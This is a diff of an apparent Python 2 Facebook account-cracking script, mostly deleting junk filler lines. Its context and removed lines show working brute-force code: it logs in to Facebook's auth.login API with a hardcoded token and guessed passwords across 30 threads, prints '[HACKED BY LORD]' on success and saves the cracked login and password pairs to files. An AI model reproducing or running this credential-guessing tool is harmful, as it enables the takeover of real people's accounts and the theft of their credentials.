@@ -33,25 +33,11 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 def keluar():
     print 'Thanks.'
     os.sys.exit()
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def acak(b):
     w = 'ahtdzjc'
@@ -60,14 +46,7 @@ def acak(b):
         d += '!' + w[random.randint(0, len(w) - 1)] + i
 
     return cetak(d)
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def cetak(b):
     w = 'ahtdzjc'
@@ -78,28 +57,14 @@ def cetak(b):
     x += '\x1b[0m'
     x = x.replace('!0', '\x1b[0m')
     sys.stdout.write(x + '\n')
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.1)
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def tik():
     titik = ['.   ', '..  ', '... ']
@@ -107,29 +72,14 @@ def tik():
         print '\r\x1b[1;94mWaiting... \x1b[1;93m' + o,
         sys.stdout.flush()
         time.sleep(1)
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def psb(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.03)
-logo = logo = logo = logo = """"""
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 back = 0
 successful = []
 cpb = []
@@ -139,15 +89,7 @@ listgrup = []
 vulnot = "\033[97mNot Vuln"
 vuln = "\033[97mVuln"
 os.system("clear")
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 import os, sys, re, time, datetime, json, random, datetime, hashlib, threading, urllib, cookielib, getpass, mechanize, requests, tqdm
 os.system('rm -rf .txt')
@@ -182,25 +124,11 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109/it_IT;FBAV/328.0.0.22.119/it_IT;FBAV/328.0.0.22.119;]')]
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 def keluar():
     print 'Thanks.'
     os.sys.exit()
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def acak(b):
     w = 'ahtdzjc'
@@ -209,14 +137,7 @@ def acak(b):
         d += '!' + w[random.randint(0, len(w) - 1)] + i
 
     return cetak(d)
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def cetak(b):
     w = 'ahtdzjc'
@@ -227,28 +148,14 @@ def cetak(b):
     x += '\x1b[0m'
     x = x.replace('!0', '\x1b[0m')
     sys.stdout.write(x + '\n')
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.1)
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def tik():
     titik = ['.   ', '..  ', '... ']
@@ -256,21 +163,14 @@ def tik():
         print '\r\x1b[1;94mWaiting... \x1b[1;93m' + o,
         sys.stdout.flush()
         time.sleep(1)
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 
 def psb(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.03)
-logo = logo = logo = logo = """"""
+
 back = 0
 successful = []
 cpb = []
@@ -280,39 +180,9 @@ listgrup = []
 vulnot = "\033[97mNot Vuln"
 vuln = "\033[97mVuln"
 os.system("clear")
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 print '\x1b\xe2\xe2[41mYOU CANT'
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
-logo = logo = logo = logo = """ """
+
 logo = logo ="""
 
 \033[41m
@@ -444,22 +314,7 @@ def action():
                 cps.write(k + c + user + '>>>' + pass2 + '\n')
                 cps.close()
                 cpb.append(c + user + pass2)
-            else:
-                pass3 = '1234554321'
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[HACKED BY LORD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
-                okb.write(k + c + user + '>>>' + pass3 + '\n')
-                okb.close()
-                oks.append(c + user + pass3)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[CHICKPOINT]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
-                cps = open('save/chickpoint.txt', 'a')
-                cps.write(k + c + user + '>>>' + pass3 + '\n')
-                cps.close()
-                cpb.append(c + user + pass3)
+
         except:
             pass
     p = ThreadPool(30)
